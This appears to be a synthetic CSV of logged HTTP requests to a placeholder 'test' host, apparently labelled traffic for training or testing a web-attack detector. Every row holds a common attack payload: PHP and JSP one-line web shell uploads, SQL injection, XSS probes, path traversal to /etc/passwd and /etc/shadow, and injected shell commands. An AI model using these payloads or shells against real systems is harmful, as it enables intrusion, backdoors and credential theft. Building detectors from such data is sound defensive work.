timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-02T06:56:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.33,1,1,3,0,403,1398
2025-01-02T06:57:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.46,22,1,85,1,200,1117
2025-01-02T06:58:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.05,8,1,28,0,500,1394
2025-01-02T06:59:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.24,13,1,22,0,302,1390
2025-01-02T07:00:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.4,2,1,11,0,500,1528
2025-01-02T07:01:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.68,6,1,22,0,403,1249
2025-01-02T07:02:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.79,10,1,27,0,500,1577
2025-01-02T07:03:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.12,3,1,15,0,403,1176
2025-01-02T07:04:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.87,3,1,18,0,403,305
2025-01-02T07:05:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,5.0,1,1,3,0,403,302
2025-01-02T07:06:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.27,19,1,55,1,302,1373
2025-01-02T07:07:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.06,7,1,25,0,403,871
2025-01-02T07:08:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,6.07,1,1,3,0,302,1382
2025-01-02T07:09:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.7,19,1,55,1,403,1496
2025-01-02T07:10:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.56,7,1,11,0,200,639
2025-01-02T07:11:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.32,19,1,55,1,200,1336
2025-01-02T07:12:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.1,6,1,21,0,302,1444
2025-01-02T07:13:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.24,0,1,2,0,500,616
2025-01-02T07:14:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.12,6,1,22,0,500,1173
2025-01-02T07:15:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.05,7,1,11,0,302,437
2025-01-02T07:16:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.53,6,1,22,0,500,1104
2025-01-02T07:17:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.83,10,1,27,0,302,1520
2025-01-02T07:18:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.03,7,1,33,0,302,1314
2025-01-02T07:19:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.97,3,1,15,0,500,1566
2025-01-02T07:20:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.69,19,1,55,1,200,1136
2025-01-02T07:21:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.88,22,1,85,1,302,277
2025-01-02T07:22:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.13,3,1,8,0,200,926
2025-01-02T07:23:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.23,7,1,19,0,500,304
2025-01-02T07:24:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.75,19,1,55,1,500,1190
2025-01-02T07:25:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.98,3,1,18,0,200,415
2025-01-02T07:26:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.1,7,1,33,0,500,1598
2025-01-02T07:27:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.52,7,1,11,0,403,1597
2025-01-02T07:28:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.46,3,1,15,0,302,284
2025-01-02T07:29:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.3,7,1,11,0,200,832
2025-01-02T07:30:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.91,13,1,22,0,403,1377
2025-01-02T07:31:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.17,3,1,8,0,500,1216
2025-01-02T07:32:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.05,7,1,25,0,302,954
2025-01-02T07:33:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.37,7,1,11,0,200,547
2025-01-02T07:34:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.05,6,1,21,0,200,682
2025-01-02T07:35:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.37,6,1,22,0,403,1021
2025-01-02T07:36:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.53,6,1,21,0,500,271
2025-01-02T07:37:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.99,19,1,55,1,302,325
2025-01-02T07:38:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.25,6,1,21,0,403,434
2025-01-02T07:39:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.09,2,1,11,0,302,1114
2025-01-02T07:40:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.54,19,1,55,1,403,1418
2025-01-02T07:41:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,6.12,7,1,11,0,403,749
2025-01-02T07:42:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.94,6,1,21,0,403,1339
2025-01-02T07:43:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.95,19,1,55,1,500,1302
2025-01-02T07:44:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.17,0,1,6,0,302,1248
2025-01-02T07:45:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.36,0,1,6,0,500,622
2025-01-02T07:46:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.78,19,1,55,1,403,833
2025-01-02T07:47:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,3.95,0,1,2,0,200,1398
2025-01-02T07:48:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.74,22,1,85,1,403,1378
2025-01-02T07:49:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.92,2,1,11,0,403,1096
2025-01-02T07:50:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.19,22,1,85,1,403,1467
2025-01-02T07:51:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.71,7,1,11,0,302,1156
2025-01-02T07:52:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.03,6,1,21,0,500,474
2025-01-02T07:53:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.31,22,1,85,1,403,641
2025-01-02T07:54:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.41,0,1,6,0,200,364
2025-01-02T07:55:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.91,2,1,11,0,200,618
2025-01-02T07:56:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.44,6,1,22,0,500,1385
2025-01-02T07:57:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.34,3,1,8,0,200,218
2025-01-02T07:58:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,3.78,0,1,6,0,200,1154
2025-01-02T07:59:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.18,2,1,11,0,500,519
2025-01-02T08:00:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.89,2,1,11,0,500,1586
2025-01-02T08:01:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.42,22,1,85,1,302,1295
2025-01-02T08:02:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.22,19,1,55,1,403,701
2025-01-02T08:03:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,3.76,7,1,25,0,200,741
2025-01-02T08:04:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,3.88,3,1,18,0,403,1342
2025-01-02T08:05:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,6.17,7,1,11,0,200,904
2025-01-02T08:06:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.39,7,1,19,0,302,1470
2025-01-02T08:07:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.86,2,1,11,0,302,489
2025-01-02T08:08:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,3.65,8,1,28,0,500,647
2025-01-02T08:09:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.22,13,1,22,0,403,1541
2025-01-02T08:10:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.57,19,1,55,1,200,1231
2025-01-02T08:11:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.56,6,1,21,0,403,1206
2025-01-02T08:12:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.19,13,1,22,0,302,582
2025-01-02T08:13:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.9,10,1,27,0,403,1424
2025-01-02T08:14:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,4.08,3,1,18,0,200,1209
2025-01-02T08:15:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.18,2,1,11,0,302,688
2025-01-02T08:16:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,3.71,7,1,25,0,200,1310
2025-01-02T08:17:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.64,22,1,85,1,403,1263
2025-01-02T08:18:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.15,22,1,85,1,500,1083
2025-01-02T08:19:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.84,2,1,11,0,403,1338
2025-01-02T08:20:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.57,8,1,28,0,200,1407
2025-01-02T08:21:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.4,19,1,55,1,500,825
2025-01-02T08:22:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.87,13,1,22,0,302,1519
2025-01-02T08:23:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.9,1,1,3,0,200,915
2025-01-02T08:24:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.93,6,1,22,0,200,1292
2025-01-02T08:25:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.04,22,1,85,1,403,788
2025-01-02T08:26:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.09,3,1,8,0,302,943
2025-01-02T08:27:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.75,7,1,33,0,500,553
2025-01-02T08:28:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.67,10,1,27,0,302,541
2025-01-02T08:29:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.18,3,1,18,0,302,653
2025-01-02T08:30:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.47,22,1,85,1,200,1293
2025-01-02T08:31:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.73,3,1,8,0,200,685
2025-01-02T08:32:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.39,6,1,21,0,500,562
2025-01-02T08:33:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,3.66,2,1,11,0,200,1326
2025-01-02T08:34:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.93,22,1,85,1,500,564
2025-01-02T08:35:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,4.31,1,1,3,0,500,249
2025-01-02T08:36:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,3.69,7,1,25,0,500,435
2025-01-02T08:37:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.45,7,1,25,0,200,1189
2025-01-02T08:38:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.6,6,1,22,0,500,1510
2025-01-02T08:39:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.75,22,1,85,1,403,380
2025-01-02T08:40:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.17,7,1,25,0,302,1504
2025-01-02T08:41:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.98,6,1,21,0,403,1334
2025-01-02T08:42:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.94,22,1,85,1,200,931
2025-01-02T08:43:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.08,19,1,55,1,403,830
2025-01-02T08:44:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.3,13,1,22,0,403,983
2025-01-02T08:45:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.2,3,1,8,0,500,392
2025-01-02T08:46:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.2,6,1,21,0,403,1137
2025-01-02T08:47:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.02,2,1,11,0,302,911
2025-01-02T08:48:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.29,7,1,11,0,403,1449
2025-01-02T08:49:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.42,13,1,22,0,500,1573
2025-01-02T08:50:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.06,2,1,11,0,302,1365
2025-01-02T08:51:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.58,7,1,33,0,403,867
2025-01-02T08:52:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,3.96,8,1,28,0,302,1490
2025-01-02T08:53:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.05,0,1,2,0,403,681
2025-01-02T08:54:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.43,0,1,2,0,500,1245
2025-01-02T08:55:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.49,19,1,55,1,200,1411
2025-01-02T08:56:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.18,7,1,25,0,302,1023
2025-01-02T08:57:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.72,13,1,22,0,500,956
2025-01-02T08:58:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.92,10,1,27,0,403,1112
2025-01-02T08:59:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.86,19,1,55,1,403,323
2025-01-02T09:00:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.41,19,1,55,1,500,619
2025-01-02T09:01:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,6.16,10,1,27,0,302,1031
2025-01-02T09:02:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.33,13,1,22,0,302,886
2025-01-02T09:03:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.96,6,1,22,0,302,1519
2025-01-02T09:04:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.39,10,1,27,0,302,403
2025-01-02T09:05:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.12,10,1,27,0,500,1316
2025-01-02T09:06:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.92,0,1,2,0,200,1152
2025-01-02T09:07:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.18,19,1,55,1,403,718
2025-01-02T09:08:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.41,3,1,8,0,500,510
2025-01-02T09:09:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.75,13,1,22,0,403,696
2025-01-02T09:10:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,6.49,7,1,25,0,200,541
2025-01-02T09:11:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.7,7,1,25,0,500,1200
2025-01-02T09:12:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.14,19,1,55,1,302,1031
2025-01-02T09:13:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.33,2,1,11,0,500,343
2025-01-02T09:14:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.63,6,1,22,0,403,656
2025-01-02T09:15:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.85,7,1,19,0,302,284
2025-01-02T09:16:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.03,7,1,33,0,302,1417
2025-01-02T09:17:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.79,7,1,33,0,302,505
2025-01-02T09:18:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.14,22,1,85,1,500,248
2025-01-02T09:19:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.9,8,1,28,0,200,1215
2025-01-02T09:20:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.27,7,1,33,0,302,1082
2025-01-02T09:21:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.86,10,1,27,0,200,398
